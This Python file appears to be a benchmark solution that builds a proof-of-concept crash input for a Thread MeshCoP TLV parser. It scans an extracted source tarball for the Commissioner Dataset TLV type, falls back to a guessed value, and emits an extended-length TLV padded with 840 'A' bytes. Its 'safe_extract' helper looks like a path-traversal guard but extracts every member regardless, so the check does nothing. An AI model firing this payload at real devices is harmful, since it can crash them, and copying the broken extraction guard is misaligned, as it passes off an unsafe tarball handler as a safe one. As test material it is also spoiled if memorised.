import os
import tarfile
import tempfile
import re


def _read_text(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except Exception:
        return ''


def _strip_comments(code):
    # Remove /* ... */ comments
    code = re.sub(r'/\*.*?\*/', '', code, flags=re.DOTALL)
    # Remove // ... comments
    code = re.sub(r'//.*?$', '', code, flags=re.MULTILINE)
    return code


def _parse_int_literal(s):
    s = s.strip()
    # Handle typical hex and decimal
    m = re.match(r'0[xX]([0-9A-Fa-f]+)', s)
    if m:
        return int(m.group(1), 16)
    m = re.match(r'(\d+)', s)
    if m:
        return int(m.group(1), 10)
    # Handle simple expressions like (0x12U) or with casts
    m = re.search(r'0[xX]([0-9A-Fa-f]+)', s)
    if m:
        return int(m.group(1), 16)
    m = re.search(r'(\d+)', s)
    if m:
        return int(m.group(1), 10)
    return None


def _find_define_value(code, name_variants):
    for name in name_variants:
        # #define NAME value
        pat = r'#\s*define\s+' + re.escape(name) + r'\s+([^\s/]+)'
        m = re.search(pat, code)
        if m:
            val = _parse_int_literal(m.group(1))
            if val is not None:
                return val
    return None


def _find_constexpr_value(code, name_variants):
    for name in name_variants:
        # static const/constexpr uint8_t kName = value;
        pat = r'(?:static\s+)?(?:const|constexpr)\s+(?:unsigned\s+)?(?:char|uint8_t|int|uint16_t|uint32_t)\s+' + re.escape(name) + r'\s*=\s*([^;]+);'
        m = re.search(pat, code)
        if m:
            val = _parse_int_literal(m.group(1))
            if val is not None:
                return val
    return None


def _parse_enum_blocks_for_value(code, target_variants):
    # Parse enum blocks and compute enumerators values.
    # Works best if enum assigns most members or uses sequential increments.
    enums = re.finditer(r'enum(?:\s+class|\s+struct)?\s*\w*\s*\{(.*?)\};', code, flags=re.DOTALL)
    for em in enums:
        body = em.group(1)
        # Split by comma, but simple split (best-effort)
        tokens = [t.strip() for t in body.split(',')]
        cur = -1
        mapping = {}
        for tok in tokens:
            if not tok:
                continue
            # name [= value]
            parts = tok.split('=')
            name = parts[0].strip()
            if not name:
                continue
            if len(parts) == 2:
                val = _parse_int_literal(parts[1])
                if val is None:
                    # Try to see if value references another enumerator we already know
                    # e.g., kX = kY
                    ref = parts[1].strip()
                    ref_name = re.match(r'([A-Za-z_][A-Za-z_0-9]*)', ref)
                    if ref_name and ref_name.group(1) in mapping:
                        val = mapping[ref_name.group(1)]
                if val is None:
                    # Can't parse this token's value; skip setting cur, but keep mapping unknown
                    continue
                cur = val
            else:
                cur += 1
            mapping[name] = cur
        # After parsing this enum block, see if any target name appears
        for tv in target_variants:
            # Look for exact or case-insensitive match ignoring prefixes 'k'
            for k, v in mapping.items():
                kk = k
                if kk.startswith('k') and len(kk) > 1 and kk[1].isupper():
                    kk_cmp = kk[1:]
                else:
                    kk_cmp = kk
                # Normalize underscores and case
                def norm(x):
                    return re.sub(r'[_\s]+', '', x).lower()
                if norm(kk) == norm(tv) or norm(kk_cmp) == norm(tv):
                    return v
    return None


def _find_commissioner_dataset_type(src_dir):
    # Collect source files
    exts = ('.h', '.hpp', '.hh', '.c', '.cc', '.cpp')
    files = []
    for root, _, fnames in os.walk(src_dir):
        for fn in fnames:
            if fn.endswith(exts):
                files.append(os.path.join(root, fn))

    name_variants = [
        'kCommissionerDataset',
        'CommissionerDataset',
        'kTypeCommissionerDataset',
        'TYPE_COMMISSIONER_DATASET',
        'COMMISSIONER_DATASET_TLV',
        'TLV_COMMISSIONER_DATASET',
        'kTlvCommissionerDataset',
        'kCommissionerDataSet',
        'COMMISSIONER_DATASET',
    ]

    # First pass: look for direct defines or constexprs
    for path in files:
        code = _strip_comments(_read_text(path))
        val = _find_define_value(code, name_variants)
        if val is not None:
            return val
        val = _find_constexpr_value(code, name_variants)
        if val is not None:
            return val

    # Second pass: look for class CommissionerDatasetTlv kType referencing some other symbol
    # and then attempt to resolve it
    ref_symbols = set()
    for path in files:
        code = _strip_comments(_read_text(path))
        # class CommissionerDatasetTlv ... enum { kType = <symbol or number> };
        m_iter = re.finditer(r'class\s+CommissionerDatasetTlv.*?\{.*?enum\s*\{[^}]*?kType\s*=\s*([^,}]+)', code, flags=re.DOTALL)
        for m in m_iter:
            rhs = m.group(1).strip()
            val = _parse_int_literal(rhs)
            if val is not None:
                return val
            # Otherwise capture the symbol to resolve later
            sym = re.match(r'([A-Za-z_][A-Za-z_0-9:]*)', rhs)
            if sym:
                ref_symbols.add(sym.group(1))

    # Try to resolve any collected symbol reference values
    if ref_symbols:
        # Build regex to find any of these symbol definitions
        for path in files:
            code = _strip_comments(_read_text(path))
            for sym in list(ref_symbols):
                # Look for 'sym = value' in enums or constexpr
                # First constexpr/const
                pat = r'(?:static\s+)?(?:const|constexpr)\s+(?:unsigned\s+)?(?:char|uint8_t|int|uint16_t|uint32_t)\s+' + re.escape(sym) + r'\s*=\s*([^;]+);'
                m = re.search(pat, code)
                if m:
                    val = _parse_int_literal(m.group(1))
                    if val is not None:
                        return val
                # Now enums: find enums containing this symbol name
                enum_val = _parse_enum_blocks_for_value(code, [sym])
                if enum_val is not None:
                    return enum_val

    # Third pass: try to parse enum blocks directly for enumerator matching variants
    for path in files:
        code = _strip_comments(_read_text(path))
        val = _parse_enum_blocks_for_value(code, name_variants)
        if val is not None:
            return val

    # Fourth pass: try to find any TLV class that mentions CommissionerDataset and get kType value
    for path in files:
        code = _strip_comments(_read_text(path))
        # Look for something like 'class ... : public Tlv { public: enum { kType = <value or symbol> }; };' around 'Commissioner' and 'Dataset'
        if 'Commissioner' in code and 'Dataset' in code:
            m_iter = re.finditer(r'enum\s*\{[^}]*?kType\s*=\s*([^,}]+)', code)
            for m in m_iter:
                rhs = m.group(1).strip()
                val = _parse_int_literal(rhs)
                if val is not None:
                    return val
                sym = re.match(r'([A-Za-z_][A-Za-z_0-9:]*)', rhs)
                if sym:
                    # Try to resolve symbol globally
                    symname = sym.group(1)
                    for p2 in files:
                        code2 = _strip_comments(_read_text(p2))
                        vv = _find_constexpr_value(code2, [symname])
                        if vv is not None:
                            return vv
                        vv = _find_define_value(code2, [symname])
                        if vv is not None:
                            return vv
                        vv = _parse_enum_blocks_for_value(code2, [symname])
                        if vv is not None:
                            return vv

    # If still not found, last attempt: search for hints in strings, e.g., switch-case on TLV type names mapping
    # e.g., case kCommissionerDataset: ...
    candidates = []
    for path in files:
        code = _strip_comments(_read_text(path))
        cs = re.finditer(r'case\s+([A-Za-z_][A-Za-z_0-9]*)\s*:', code)
        for c in cs:
            sym = c.group(1)
            if 'Commissioner' in sym and 'Dataset' in sym:
                # try resolve
                for p2 in files:
                    code2 = _strip_comments(_read_text(p2))
                    vv = _find_constexpr_value(code2, [sym])
                    if vv is not None:
                        return vv
                    vv = _find_define_value(code2, [sym])
                    if vv is not None:
                        return vv
                    vv = _parse_enum_blocks_for_value(code2, [sym])
                    if vv is not None:
                        return vv
                candidates.append(sym)

    # If everything failed, return a commonly used guess for Thread MeshCoP Commissioner Dataset TLV type
    # Use a set of plausible values observed across implementations; pick most plausible: 0x33 (51).
    return 0x33


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract tarball
        tmpdir = tempfile.mkdtemp(prefix='arv20775_')
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory

                def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                    for member in tar.getmembers():
                        member_path = os.path.join(path, member.name)
                        if not is_within_directory(path, member_path):
                            continue
                    tar.extractall(path, members, numeric_owner=numeric_owner)

                safe_extract(tf, tmpdir)
        except Exception:
            # If extraction fails, just proceed with default guess
            pass

        tlv_type = _find_commissioner_dataset_type(tmpdir)

        # Compose TLV with extended length 840 -> total length 4 + 840 = 844 bytes
        ext_len = 840
        # Extended length encoding: Length byte 0xFF, then 2-byte big-endian length
        header = bytes([
            tlv_type & 0xFF,
            0xFF,
            (ext_len >> 8) & 0xFF,
            ext_len & 0xFF,
        ])
        value = b'A' * ext_len
        poc = header + value
        return poc